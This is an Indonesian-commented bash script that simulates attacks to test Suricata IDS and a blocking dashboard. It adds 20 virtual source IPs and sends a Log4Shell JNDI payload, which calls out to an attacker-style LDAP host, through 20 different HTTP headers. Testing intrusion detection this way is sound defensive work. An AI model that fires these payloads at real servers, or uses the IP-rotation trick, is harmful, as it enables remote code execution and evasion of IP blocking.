#!/usr/bin/env bash
# =============================================================================
#  attack_sim.sh — Simulasi Serangan Multi-IP untuk Menguji Suricata
#  Author  : Levi (github.com/LEVI6957)
#  Usage   : sudo bash attack_sim.sh [TARGET_IP] [TARGET_PORT]
#
#  Skrip ini membuat IP virtual di interface jaringan utama,
#  lalu menyerang server target menggunakan berbagai jenis serangan
#  dari IP yang berbeda-beda agar terlihat seperti serangan dari
#  banyak peretas sekaligus.
# =============================================================================

# ── Warna ────────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ── Konfigurasi ───────────────────────────────────────────────────────────────
TARGET_IP="${1:-192.168.1.3}"
TARGET_PORT="${2:-8080}"
TARGET="http://${TARGET_IP}:${TARGET_PORT}"

# Deteksi interface jaringan utama secara otomatis
IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
if [[ -z "$IFACE" ]]; then
    IFACE="eth0"
fi

# Ambil IP address dari interface tersebut
KALI_IP=$(ip -o -4 addr show dev "$IFACE" | awk '{print $4}' | cut -d/ -f1)

# Buat base IP berdasarkan 3 oktet pertama dari IP Kali
# (Contoh: jika IP Kali 170.2.50.10 -> IP_BASE=170.2.50)
IP_BASE=$(echo "$KALI_IP" | cut -d. -f1,2,3)

if [[ -z "$IP_BASE" ]]; then
    IP_BASE="192.168.1" # Fallback
fi

# Range IP virtual yang akan dibuat (Contoh: 170.2.50.50 - 170.2.50.69)
IP_START=50
IP_COUNT=20

# Delay antar serangan (detik) — ubah ke 0 untuk serangan kilat
DELAY=0.5

# ── Fungsi Helper ─────────────────────────────────────────────────────────────
info()    { echo -e "${GREEN}[INFO]${NC}  $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
attack()  { echo -e "${RED}[ATK]${NC}   $*"; }
success() { echo -e "${CYAN}[OK]${NC}    $*"; }
header()  { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════${NC}";
            echo -e "${BOLD}${BLUE}  $*${NC}";
            echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}\n"; }

# ── Root Check ────────────────────────────────────────────────────────────────
[[ $EUID -ne 0 ]] && echo -e "${RED}[ERROR]${NC} Jalankan dengan sudo: sudo bash attack_sim.sh" && exit 1

# ── Cleanup saat EXIT ─────────────────────────────────────────────────────────
cleanup() {
    echo ""
    warn "Membersihkan IP virtual..."
    for i in $(seq $IP_START $((IP_START + IP_COUNT - 1))); do
        ip addr del "${IP_BASE}.${i}/24" dev "$IFACE" 2>/dev/null
    done
    success "Semua IP virtual dihapus. Bersih!"
}
trap cleanup EXIT

# ─────────────────────────────────────────────────────────────────────────────
header "🔥 SURICATA ATTACK SIMULATOR"
echo -e "  Target    : ${BOLD}${TARGET}${NC}"
echo -e "  Interface : ${BOLD}${IFACE}${NC}"
echo -e "  IP Range  : ${BOLD}${IP_BASE}.${IP_START} - ${IP_BASE}.$((IP_START + IP_COUNT - 1))${NC}"
echo -e "  Delay     : ${BOLD}${DELAY}s${NC}"
echo ""
warn "Pastikan IP target (${TARGET_IP}) TIDAK ada di Whitelist Dasbor agar bisa diblokir!"
echo ""
read -rp "$(echo -e ${YELLOW}[?]${NC}) Lanjut? (y/N): " confirm
[[ "${confirm,,}" != "y" ]] && echo "Dibatalkan." && exit 0

# ── Langkah 1: Buat IP Virtual ────────────────────────────────────────────────
header "1. Membuat IP Virtual"
for i in $(seq $IP_START $((IP_START + IP_COUNT - 1))); do
    ip addr add "${IP_BASE}.${i}/24" dev "$IFACE" 2>/dev/null
    success "IP virtual dibuat: ${IP_BASE}.${i}"
done

# Tunggu sebentar agar routing stabil
sleep 1

# ── Langkah 2: Eksekusi Serangan ─────────────────────────────────────────────
header "2. Memulai Simulasi Serangan"

run_attack() {
    local src_ip="$1"
    local desc="$2"
    local url="$3"
    local extra_args="${4:-}"

    attack "${desc} dari ${BOLD}${src_ip}${NC}"
    curl -s --max-time 3 --interface "$src_ip" $extra_args "$url" -o /dev/null 2>/dev/null
    sleep "$DELAY"
}

# ── Daftar header Log4Shell yang berbeda-beda ─────────────────────────────────
# Suricata mendeteksi pola ${jndi: di berbagai header HTTP
HEADERS=(
    "X-Api-Version"
    "User-Agent"
    "X-Forwarded-For"
    "Referer"
    "X-Client-IP"
    "X-Real-IP"
    "Accept-Language"
    "Authorization"
    "X-Originating-IP"
    "X-Remote-IP"
    "X-Remote-Addr"
    "CF-Connecting-IP"
    "True-Client-IP"
    "X-Cluster-Client-IP"
    "Forwarded"
    "X-Forwarded-Host"
    "X-Host"
    "X-Original-URL"
    "X-Wap-Profile"
    "Contact"
)

PAYLOAD="\${jndi:ldap://evil.levi.com/exploit}"

echo ""
info "Menggunakan serangan Log4Shell (CVE-2021-44228)"
info "Payload dikirim via 20 header HTTP berbeda dari 20 IP berbeda"
echo ""

for idx in "${!HEADERS[@]}"; do
    SRC_IP="${IP_BASE}.$((IP_START + idx))"
    HDR="${HEADERS[$idx]}"

    attack "Log4Shell [${HDR}] dari ${BOLD}${SRC_IP}${NC}"
    curl -s --max-time 3 \
        --interface "$SRC_IP" \
        -H "${HDR}: ${PAYLOAD}" \
        "${TARGET}/" \
        -o /dev/null 2>/dev/null

    sleep "$DELAY"
done


# ── Ringkasan ─────────────────────────────────────────────────────────────────
header "✅ Simulasi Selesai!"
echo -e "  ${BOLD}20 serangan${NC} dari ${BOLD}20 IP berbeda${NC} telah diluncurkan!"
echo ""
echo -e "  ${GREEN}➜${NC} Buka Dasbor: ${BOLD}http://${TARGET_IP}:${TARGET_PORT}${NC}"
echo -e "  ${GREEN}➜${NC} Lihat IP mana yang berhasil diblokir di tabel ${BOLD}IP Diblok${NC}"
echo -e "  ${GREEN}➜${NC} Cek notifikasi di Discord/Webhook-mu"
echo ""
